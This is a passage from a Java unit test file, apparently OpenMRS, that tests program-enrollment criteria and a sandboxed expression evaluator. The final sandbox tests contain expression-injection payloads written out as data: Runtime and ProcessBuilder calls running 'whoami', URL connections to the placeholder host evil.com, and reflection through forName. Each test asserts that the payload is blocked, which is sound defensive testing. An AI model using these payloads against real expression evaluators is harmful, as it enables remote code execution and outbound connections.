		Patient patient = Context.getPatientService().getPatient(2); // from standard test dataset
		Obs obs = buildObs();
		obs.setPerson(patient);
		assertTrue(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.isEnrolledInProgram('da4a0391-ba62-4fad-ad66-1e3722d16380', $patient, $obs.obsDatetime)", obs)); // uuid of HIV program which patient 2 is enrolled in
	}

	@Test
	public void isEnrolledInProgram_shouldReturnFalseIfPatientIsNotEnrolledInProgramOnDate() {
		Patient patient = Context.getPatientService().getPatient(2); // from standard test dataset
		Obs obs = buildObs();
		obs.setObsDatetime(new DateTime(2006, 1, 1, 1, 1).toDate());
		obs.setPerson(patient);
		assertFalse(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.isEnrolledInProgram('da4a0391-ba62-4fad-ad66-1e3722d16380', $patient, $obs.obsDatetime)", obs)); // uuid of HIV program which patient 2 is enrolled in, but not until 2008
	}

	@Test
	public void isEnrolledInProgram_shouldReturnFalseIfPatientIsNotEnrolledInProgram() {
		Patient patient = Context.getPatientService().getPatient(2); // from standard test dataset
		Obs obs = buildObs();
		obs.setPerson(patient);
		assertFalse(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.isEnrolledInProgram('f386c3d2-dd75-441f-a582-2237824edfb0', $patient, $obs.obsDatetime)", obs)); // uuid of the Malaria program which patient 2 is not enrolled in
	}

	@Test
	public void isEnrolledInProgram_shouldReturnFalseIfPersonIsNotPatient() {
		// not likely a real use case, but just testing it doesn't throw an exception
		Person person = Context.getPersonService().getPerson(9); // from standard test dataset
		assertFalse(person.getIsPatient());
		Obs obs = buildObs();
		obs.setPerson(person);
		assertFalse(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.isEnrolledInProgram('f386c3d2-dd75-441f-a582-2237824edfb0', $patient, $obs.obsDatetime)", obs));
	}

	@Test
	public void isInProgramState_shouldReturnTrueIfPatientInState() {
		Patient patient = Context.getPatientService().getPatient(2); // from standard test dataset
		Obs obs = buildObs();
		obs.setPerson(patient);
		assertTrue(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.isInProgramState('e938129e-248a-482a-acea-f85127251472', $patient, $obs.obsDatetime)", obs)); // uuid from standard test dataset, patient is in this state
	}

	@Test
	public void isInProgramState_shouldReturnFalseIfPatientIsNotInStateOnDate() {
		Patient patient = Context.getPatientService().getPatient(2); // from standard test dataset
		Obs obs = buildObs();
		obs.setObsDatetime(new DateTime(2006, 1, 1, 1, 1).toDate());
		obs.setPerson(patient);
		assertFalse(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.isInProgramState('e938129e-248a-482a-acea-f85127251472', $patient, $obs.obsDatetime)", obs)); // uuid from standard test dataset, patient is in this state, but not until 2008
	}

	@Test
	public void isInProgramState_shouldReturnFalseIfPatientIsNotInState() {
		Patient patient = Context.getPatientService().getPatient(6); // from standard test dataset, different patient that is not in this state
		Obs obs = buildObs();
		obs.setPerson(patient);
		assertFalse(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.isInProgramState('e938129e-248a-482a-acea-f85127251472', $patient, $obs.obsDatetime)", obs));
	}

	@Test
	public void isInProgramState_shouldReturnFalseIfPersonIsNotPatient() {
		// not likely a real use case, but just testing it doesn't throw an exception
		Person person = Context.getPersonService().getPerson(9); // from standard test dataset
		assertFalse(person.getIsPatient());
		Obs obs = buildObs();
		obs.setPerson(person);
		assertFalse(conceptReferenceRangeUtility.evaluateCriteria(
		    "$fn.isInProgramState('e938129e-248a-482a-acea-f85127251472', $patient, $obs.obsDatetime)", obs));
	}

	@Test
	public void testSandbox_shouldBlockTypeReferencesPreventingRCE() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertThrows(APIException.class,
		    () -> conceptReferenceRangeUtility.evaluateCriteria("T(java.lang.Runtime).getRuntime()", obs));
	}

	@Test
	public void testSandbox_shouldBlockConstructorInvocation() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertThrows(APIException.class, () -> conceptReferenceRangeUtility
		        .evaluateCriteria("new java.net.URL('http://evil.com').openConnection()", obs));
	}

	@Test
	public void testSandbox_shouldBlockBeanReferences() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertThrows(APIException.class, () -> conceptReferenceRangeUtility.evaluateCriteria("@systemProperties", obs));
	}

	@Test
	public void testSandbox_shouldBlockReflectionViaGetClass() {
		calendar = Calendar.getInstance();
		calendar.add(Calendar.YEAR, -5);
		person.setBirthdate(calendar.getTime());

		Obs obs = buildObs();
		obs.setPerson(person);

		assertThrows(APIException.class,
		    () -> conceptReferenceRangeUtility.evaluateCriteria("$patient.getClass().forName('java.lang.Runtime')", obs));
	}

	@Test
	public void testSandbox_shouldBlockProcessBuilderViaTypeReference() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertThrows(APIException.class,
		    () -> conceptReferenceRangeUtility.evaluateCriteria("T(java.lang.ProcessBuilder).new({'whoami'}).start()", obs));
	}

	@Test
	public void testSandbox_shouldBlockURLConnectionViaTypeReference() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertThrows(APIException.class, () -> conceptReferenceRangeUtility
		        .evaluateCriteria("T(java.net.URL).new('http://evil.com').openConnection()", obs));
	}

	@Test
	public void testSandbox_shouldNotExposeEvaluateCriteriaViaFn() {
		Obs obs = buildObs();
		obs.setPerson(person);

		assertThrows(APIException.class,
		    () -> conceptReferenceRangeUtility.evaluateCriteria("$fn.evaluateCriteria('$patient.getAge() > 0', $obs)", obs));
	}

	private Obs buildObs() {
		Concept concept = new Concept(5089);
		concept.setDatatype(new ConceptDatatype(3));

		Date date = new Date();

		Obs obs = new Obs();
		obs.setConcept(concept);
		obs.setEncounter(new Encounter(3));
		obs.setObsDatetime(date);
		obs.setLocation(new Location(1));
		obs.setValueGroupId(7);
		obs.setValueDatetime(date);
		obs.setValueCoded(new Concept(3));
		obs.setValueNumeric(2.0);
		obs.setValueModifier("cc");

		return obs;
	}
}
